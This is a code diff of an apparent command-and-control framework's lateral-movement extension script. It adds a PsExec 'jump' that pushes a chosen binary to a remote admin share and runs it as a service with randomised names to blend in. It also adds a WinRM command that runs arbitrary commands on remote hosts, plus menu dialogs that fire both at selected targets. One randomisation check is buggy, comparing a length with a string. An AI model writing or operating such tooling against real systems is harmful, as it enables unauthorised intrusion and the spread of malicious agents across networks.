@@ -3,21 +3,54 @@ var metadata = {
     description: "BOFs for lateral movement"
 };
 
-var _cmd_jump_psexec = ax.create_command("psexec", "Attempt to spawn a session on a remote target via PsExec", "jump psexec 192.168.0.1 /tmp/agent_svc.exe");
+var _cmd_jump_psexec = ax.create_command("psexec", "Attempt to spawn a session on a remote target via PsExec", "jump psexec 192.168.0.1 /tmp/agent_svc.exe -b update.exe -s C$ -p C: -n UpdateService -d UpdateService");
+_cmd_jump_psexec.addArgFlagString( "-b", "binary_name",     "Remote binary name", "random");
+_cmd_jump_psexec.addArgFlagString( "-s", "share",           "Share for for copying the file", "ADMIN$");
+_cmd_jump_psexec.addArgFlagString( "-p", "svc_path",        "Path to the service file", "C:\\Windows");
+_cmd_jump_psexec.addArgFlagString( "-n", "svc_name",        "Service name", "random");
+_cmd_jump_psexec.addArgFlagString( "-d", "svc_description", "Service description", "random");
 _cmd_jump_psexec.addArgString("target", true);
 _cmd_jump_psexec.addArgFile("binary", true);
 _cmd_jump_psexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-    let target = parsed_json["target"];
-    let binary_content = parsed_json["binary"];
+    let target          = parsed_json["target"];
+    let binary_content  = parsed_json["binary"];
+    let share           = parsed_json["share"];
+    let binary_name     = parsed_json["binary_name"];
+    let svc_path        = parsed_json["svc_path"];
+    let svc_name        = parsed_json["svc_name"];
+    let svc_description = parsed_json["svc_description"];
 
-    let bof_params = ax.bof_pack("cstr,bytes", [target, binary_content]);
+    if (binary_name == "random")  binary_name = ax.random_string(8, "alphabetic") + ".exe";
+    if (svc_name.length == "random")  svc_name = ax.random_string(10, "alphabetic");
+    if (svc_description.length == "random")  svc_description = ax.random_string(16, "alphabetic");
+
+    let bof_params = ax.bof_pack("cstr,bytes,cstr,cstr,cstr,cstr,cstr", [target, binary_content, binary_name, share, svc_path, svc_name, svc_description]);
     let bof_path = ax.script_dir() + "_bin/psexec." + ax.arch(id) + ".o";
-    let message = `Task: Jimp to ${target} via PsExec`;
+    let message = `Task: Jump to ${target} via PsExec (${binary_name})`;
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
 var cmd_jump = ax.create_command("jump", "Attempt to spawn a session on a remote target with the specified method");
 cmd_jump.addSubCommands([_cmd_jump_psexec]);
+
+
+
+var _cmd_invoke_winrm = ax.create_command("winrm", "Use WinRM to execute commands on other systems", "invoke winrm 192.168.0.1 whoami /all");
+_cmd_invoke_winrm.addArgString("target", true);
+_cmd_invoke_winrm.addArgString("cmd", true);
+_cmd_invoke_winrm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let target = parsed_json["target"];
+    let cmd = parsed_json["cmd"];
+
+    let bof_params = ax.bof_pack("wstr,wstr", [target, cmd]);
+    let bof_path = ax.script_dir() + "_bin/winrm." + ax.arch(id) + ".o";
+    let message = `Task: Invoke to ${target} via WinRM`;
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+var cmd_invoke = ax.create_command("invoke", "Attempt to execute a command on a remote target with the specified method");
+cmd_invoke.addSubCommands([_cmd_invoke_winrm]);
+
 
 
 let hook_impersonate = function (task)
@@ -68,7 +101,8 @@ var cmd_token = ax.create_command("token", "Impersonate token");
 cmd_token.addSubCommands([_cmd_token_make, _cmd_token_steal]);
 
 
-var group_test = ax.create_commands_group("LateralMovement-BOF", [cmd_jump, cmd_token]);
+
+var group_test = ax.create_commands_group("LateralMovement-BOF", [cmd_jump, cmd_invoke, cmd_token]);
 ax.register_commands_group(group_test, ["beacon", "gopher"], ["windows"], []);
 
 
@@ -144,17 +178,9 @@ menu.add_session_access(token_make_action, ["beacon", "gopher"], ["windows"]);
 
 /// MENU TARGETS
 
-let jump_action = menu.create_action("Jump to ...", function(targets_id) {
-    let methods = {
-        "PsExec": "jump psexec"
-    };
-
+let psexec_action = menu.create_action("PsExec", function(targets_id) {
     let agents_selector = form.create_selector_agents(["id", "type", "computer", "username", "process", "pid", "tags"]);
     agents_selector.setSize(1000, 400);
-
-    let label_method = form.create_label("Jump method:");
-    let combo_method = form.create_combo();
-    combo_method.addItems(["PsExec"]);
 
     let label_format = form.create_label("Target format:");
     let combo_format = form.create_combo();
@@ -164,21 +190,52 @@ let jump_action = menu.create_action("Jump to ...", function(targets_id) {
     let text_file   = form.create_textline();
     let button_file = form.create_button("...");
 
-    let agent_label    = form.create_label("Session:");
-    let agent_text     = form.create_textline();
-    let select_button  = form.create_button("...");
+    let agent_label   = form.create_label("Session:");
+    let agent_text    = form.create_textline();
+    let select_button = form.create_button("...");
+
+    let hline = form.create_hline()
+
+    let share_label = form.create_label("Share:");
+    let share_text  = form.create_textline();
+    share_text.setPlaceholder("Default: ADMIN$");
+
+    let path_label = form.create_label("Remote path:");
+    let path_text  = form.create_textline();
+    path_text.setPlaceholder("Default: C:\\Windows");
+
+    let bin_name_label = form.create_label("Binary name:");
+    let bin_name_text  = form.create_textline();
+    bin_name_text.setPlaceholder("Default: random");
+
+    let svc_name_label = form.create_label("Svc Name:");
+    let svc_name_text  = form.create_textline();
+    svc_name_text.setPlaceholder("Default: random");
+
+    let svc_desc_label = form.create_label("Svc Description:");
+    let svc_desc_text  = form.create_textline();
+    svc_desc_text.setPlaceholder("Default: random");
 
     let layout = form.create_gridlayout();
-    layout.addWidget(label_method,  0, 0, 1, 1);
-    layout.addWidget(combo_method,  0, 1, 1, 2);
-    layout.addWidget(label_format,  1, 0, 1, 1);
-    layout.addWidget(combo_format,  1, 1, 1, 2);
-    layout.addWidget(label_file,    2, 0, 1, 1);
-    layout.addWidget(text_file,     2, 1, 1, 1);
-    layout.addWidget(button_file,   2, 2, 1, 1);
-    layout.addWidget(agent_label,   3, 0, 1, 1);
-    layout.addWidget(agent_text,    3, 1, 1, 1);
-    layout.addWidget(select_button, 3, 2, 1, 1);
+    layout.addWidget(label_format,   0, 0, 1, 1);
+    layout.addWidget(combo_format,   0, 1, 1, 2);
+    layout.addWidget(label_file,     1, 0, 1, 1);
+    layout.addWidget(text_file,      1, 1, 1, 1);
+    layout.addWidget(button_file,    1, 2, 1, 1);
+    layout.addWidget(agent_label,    2, 0, 1, 1);
+    layout.addWidget(agent_text,     2, 1, 1, 1);
+    layout.addWidget(select_button,  2, 2, 1, 1);
+    layout.addWidget(hline,          3, 0, 1, 3);
+    layout.addWidget(share_label,    4, 0, 1, 1);
+    layout.addWidget(share_text,     4, 1, 1, 2);
+    layout.addWidget(path_label,     5, 0, 1, 1);
+    layout.addWidget(path_text,      5, 1, 1, 2);
+    layout.addWidget(bin_name_label, 6, 0, 1, 1);
+    layout.addWidget(bin_name_text,  6, 1, 1, 2);
+    layout.addWidget(svc_name_label, 7, 0, 1, 1);
+    layout.addWidget(svc_name_text,  7, 1, 1, 2);
+    layout.addWidget(svc_desc_label, 8, 0, 1, 1);
+    layout.addWidget(svc_desc_text,  8, 1, 1, 2);
 
     form.connect(select_button, "clicked", function(){
         let agents = agents_selector.exec();
@@ -192,8 +249,8 @@ let jump_action = menu.create_action("Jump to ...", function(targets_id) {
         text_file.setText( ax.prompt_open_file() );
     });
 
-    let dialog = form.create_dialog("Jump to");
-    dialog.setSize(400, 180);
+    let dialog = form.create_dialog("Jump using PsExec");
+    dialog.setSize(500, 300);
     dialog.setLayout(layout);
     dialog.setButtonsText("Execute", "Cancel");
     while ( dialog.exec() == true )  {
@@ -204,7 +261,82 @@ let jump_action = menu.create_action("Jump to ...", function(targets_id) {
         if(payload_content.length == 0) { ax.show_message("Error", `file ${payload_path} not readed`); continue; }
 
         let format = combo_format.currentText();
-        let method = methods[combo_method.currentText()];
+        let agent_id = agent_text.text();
+
+        let command_params = "";
+        if (share_text.text().length)    { command_params += ` -s "${share_text.text()}"`; }
+        if (path_text.text().length)     { command_params += ` -p "${path_text.text()}"`; }
+        if (bin_name_text.text().length) { command_params += ` -b "${bin_name_text.text()}"`; }
+        if (svc_name_text.text().length) { command_params += ` -n "${svc_name_text.text()}"`; }
+        if (svc_desc_text.text().length) { command_params += ` -d "${svc_desc_text.text()}"`; }
+
+        let targets = ax.targets()
+        targets_id.forEach((id) => {
+            let addr = targets[id].address;
+            if(format == "FQDN") { addr = targets[id].computer; }
+            if(addr.length == 0 ) {
+                ax.show_message("Error", "Target is empty!");
+            }
+            else {
+                let command = `jump psexec ${addr} ${payload_path}`;
+                if (command_params.length > 0)
+                    command += command_params;
+
+                ax.execute_command(agent_id, command);
+            }
+        });
+        break;
+    }
+});
+
+let jump_menu = menu.create_menu("Jump to   ");
+jump_menu.addItem(psexec_action)
+menu.add_targets(jump_menu, "top");
+
+
+
+let winrm_action = menu.create_action("WinRM", function(targets_id) {
+    let agents_selector = form.create_selector_agents(["id", "type", "computer", "username", "process", "pid", "tags"]);
+    agents_selector.setSize(1000, 400);
+
+    let label_format = form.create_label("Target format:");
+    let combo_format = form.create_combo();
+    combo_format.addItems(["FQDN", "IP address"]);
+
+    let label_command = form.create_label("Command:");
+    let text_command  = form.create_textmulti();
+
+    let agent_label   = form.create_label("Session:");
+    let agent_text    = form.create_textline();
+    let select_button = form.create_button("...");
+
+    let layout = form.create_gridlayout();
+    layout.addWidget(label_format,  0, 0, 1, 1);
+    layout.addWidget(combo_format,  0, 1, 1, 2);
+    layout.addWidget(label_command, 1, 0, 1, 1);
+    layout.addWidget(text_command,  1, 1, 1, 2);
+    layout.addWidget(agent_label,   2, 0, 1, 1);
+    layout.addWidget(agent_text,    2, 1, 1, 1);
+    layout.addWidget(select_button, 2, 2, 1, 1);
+
+    form.connect(select_button, "clicked", function(){
+        let agents = agents_selector.exec();
+        if (agents.length > 0) {
+            let agent = agents[0];
+            agent_text.setText(agent["id"]);
+        }
+    });
+
+    let dialog = form.create_dialog("Invoke using WinRM");
+    dialog.setSize(400, 180);
+    dialog.setLayout(layout);
+    dialog.setButtonsText("Execute", "Cancel");
+    while ( dialog.exec() == true )  {
+
+        let target_cmd = text_command.text();
+        if(target_cmd.length == 0) { ax.show_message("Error", "Command not specified"); continue; }
+
+        let format = combo_format.currentText();
         let agent_id = agent_text.text();
 
         let targets = ax.targets()
@@ -215,11 +347,14 @@ let jump_action = menu.create_action("Jump to ...", function(targets_id) {
                 ax.show_message("Error", "Target is empty!");
             }
             else {
-                let command = `${method} ${addr} ${payload_path}`;
+                let command = `invoke winrm ${addr} ${target_cmd}`;
                 ax.execute_command(agent_id, command);
             }
         });
         break;
     }
 });
-menu.add_targets(jump_action, "top");
+
+let invoke_menu = menu.create_menu("Invoke on   ");
+invoke_menu.addItem(winrm_action)
+menu.add_targets(invoke_menu, "top");
